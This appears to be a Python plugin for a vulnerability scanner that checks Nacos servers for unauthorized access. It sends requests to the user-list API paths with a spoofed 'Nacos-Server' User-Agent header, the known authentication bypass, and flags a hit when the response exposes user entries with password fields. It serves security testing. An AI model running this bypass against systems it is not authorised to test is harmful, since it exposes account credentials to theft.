from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Nacos 未授权访问"
        self.app_name = 'Nacos'
        self.scheme = [SchemeType.HTTPS, SchemeType.HTTP]

    def verify(self, target):
        paths = ["/v1/auth/users?pageNo=1&pageSize=10", "/nacos/v1/auth/users?pageNo=1&pageSize=10"]
        for path in paths:
            url = target + path
            headers = {
                "User-Agent": "Nacos-Server"
            }
            conn = http_req(url, headers=headers)
            if b"<" in conn.content:
                continue

            if b'"pageNumber"' in conn.content and b'"password"' in conn.content:
                conn.json()

                self.logger.success("发现 Nacos 未授权访问 {}".format(self.target))
                return url
